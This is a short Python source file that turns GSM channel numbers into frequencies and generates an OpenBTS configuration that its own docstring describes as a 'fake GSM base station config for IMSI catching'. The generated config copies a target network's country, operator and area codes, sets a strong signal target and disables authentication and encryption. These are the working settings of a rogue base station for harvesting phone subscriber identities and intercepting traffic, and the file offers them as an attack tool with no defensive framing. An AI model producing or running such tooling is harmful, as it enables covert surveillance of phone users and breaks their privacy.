def arfcn_to_freq(arfcn, band):
    """Convert ARFCN to uplink/downlink frequencies per 3GPP TS 45.005."""
    if band == 'GSM-900':
        if 1 <= arfcn <= 124:
            uplink = 890.0 + 0.2 * arfcn
            downlink = uplink + 45.0
        elif arfcn == 0:
            uplink = 890.0
            downlink = 935.0
        else:
            raise ValueError(f"Invalid ARFCN {arfcn} for GSM-900")
    elif band == 'EGSM-900':
        if 0 <= arfcn <= 124:
            uplink = 890.0 + 0.2 * arfcn
            downlink = uplink + 45.0
        elif 975 <= arfcn <= 1023:
            uplink = 890.0 + 0.2 * (arfcn - 1024)
            downlink = uplink + 45.0
        else:
            raise ValueError(f"Invalid ARFCN {arfcn} for EGSM-900")
    elif band == 'DCS-1800':
        if 512 <= arfcn <= 885:
            uplink = 1710.2 + 0.2 * (arfcn - 512)
            downlink = uplink + 95.0
        else:
            raise ValueError(f"Invalid ARFCN {arfcn} for DCS-1800")
    elif band == 'PCS-1900':
        if 512 <= arfcn <= 810:
            uplink = 1850.2 + 0.2 * (arfcn - 512)
            downlink = uplink + 80.0
        else:
            raise ValueError(f"Invalid ARFCN {arfcn} for PCS-1900")
    else:
        raise ValueError(f"Unknown band: {band}")
    return round(uplink, 1), round(downlink, 1)


def generate_neighbor_arfcns(arfcn, band, count=5):
    """Generate nearby ARFCNs for neighbor list."""
    neighbors = []
    for offset in range(-count, count + 1):
        if offset == 0:
            continue
        n = arfcn + offset
        try:
            arfcn_to_freq(n, band)
            neighbors.append(n)
        except ValueError:
            continue
    return neighbors[:count]


def generate_bts_config(mcc, mnc, lac, arfcn, band='GSM-900', power_dbm=30):
    """Generate fake GSM base station config for IMSI catching."""
    uplink, downlink = arfcn_to_freq(arfcn, band)
    neighbors = generate_neighbor_arfcns(arfcn, band)
    config_lines = [
        "# OpenBTS Fake BTS Configuration",
        "", "[GSM]",
        f"Radio.Band={band}", f"Radio.C0={arfcn}",
        f"GSM.Identity.MCC={mcc}", f"GSM.Identity.MNC={mnc}",
        f"GSM.Identity.LAC={lac}", "GSM.Identity.CI=1",
        "GSM.Radio.RSSITarget=-50",
        f"GSM.Neighbors={' '.join(str(n) for n in neighbors)}",
        "", "[TRX]", "TRX.RadioFrequencyOffset=0",
        "", f"# Uplink:   {uplink} MHz",
        f"# Downlink: {downlink} MHz",
        f"# TX Power: {power_dbm} dBm",
        "GSM.Authentication=0", "GSM.Encryption=0",
    ]
    return {
        'uplink_freq_mhz': uplink,
        'downlink_freq_mhz': downlink,
        'config_text': '\n'.join(config_lines),
        'neighbor_arfcns': neighbors,
        'band': band,
        'arfcn': arfcn,
    }
